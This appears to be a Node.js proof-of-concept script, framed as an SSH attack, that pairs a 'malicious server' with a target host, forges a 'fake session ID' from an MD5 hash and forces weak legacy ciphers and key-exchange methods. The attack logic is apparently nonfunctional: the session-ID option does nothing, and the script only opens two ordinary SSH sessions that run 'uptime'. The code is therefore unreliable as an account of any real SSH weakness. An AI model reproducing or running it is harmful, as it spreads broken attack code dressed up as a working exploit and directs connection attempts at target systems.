const { Client } = require('ssh2');
const crypto = require('crypto');

// Target and malicious server details
const TARGET_IP = 'xxxxxxxxxx';
const TARGET_PORT = 22;
const MALICIOUS_SERVER_IP = 'x';
const MALICIOUS_SERVER_PORT = 22;
const USERNAME = 'xxxxxxxxxxx';
const PASSWORD = 'xxxxxxxxxxxxx';
function generateFakeSessionID() {
    const fakeHostKey = crypto.randomBytes(16);
    const cookie = crypto.randomBytes(8);
    const sessionId = crypto.createHash('md5').update(fakeHostKey).update(cookie).digest();
    return sessionId;
}

function setupSSHClient(ip, port, username, password) {
    const conn = new Client();
    conn.on('ready', () => {
        console.log('Client :: ready');
        conn.exec('uptime', (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream :: close :: code: ' + code + ', signal: ' + signal);
                conn.end();
            }).on('data', (data) => {
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.error('Connection error:', err);
    }).on('keyboard-interactive', (name, instructions, instructionsLang, prompts, finish) => {
        console.log('Keyboard Interactive Prompt');
        finish([password]);
    }).connect({
        host: ip,
        port: port,
        username: username,
        password: password,
        tryKeyboard: true,
        algorithms: {
            kex: [
                'diffie-hellman-group1-sha1',
                'diffie-hellman-group14-sha1',
                'diffie-hellman-group-exchange-sha1',
                'diffie-hellman-group-exchange-sha256',
                'ecdh-sha2-nistp256',
                'ecdh-sha2-nistp384',
                'ecdh-sha2-nistp521',
                'curve25519-sha256',
                'curve25519-sha256@libssh.org'
            ],
            cipher: [
                'aes128-ctr',
                'aes192-ctr',
                'aes256-ctr',
                'aes128-gcm',
                'aes128-gcm@openssh.com',
                'aes256-gcm',
                'aes256-gcm@openssh.com',
                'aes256-cbc'
            ],
            serverHostKey: [
                'ssh-rsa',
                'ssh-dss',
                'ecdsa-sha2-nistp256',
                'ecdsa-sha2-nistp384',
                'ecdsa-sha2-nistp521',
                'ssh-ed25519'
            ],
            hmac: [
                'hmac-sha2-256',
                'hmac-sha2-512',
                'hmac-sha1',
                'hmac-md5',
                'hmac-sha2-256-96',
                'hmac-sha2-512-96',
                'hmac-ripemd160'
            ],
            compress: [
                'none',
                'zlib@openssh.com',
                'zlib'
            ]
        },
        hostHash: 'md5',
        sessionId: generateFakeSessionID()
    });
}

function simulateAttack() {
    const fakeSessionID = generateFakeSessionID();
    console.log('Simulating attack with fake session ID:', fakeSessionID.toString('hex'));

    setupSSHClient(MALICIOUS_SERVER_IP, MALICIOUS_SERVER_PORT, USERNAME, PASSWORD);

    setupSSHClient(TARGET_IP, TARGET_PORT, USERNAME, PASSWORD);
}

simulateAttack();
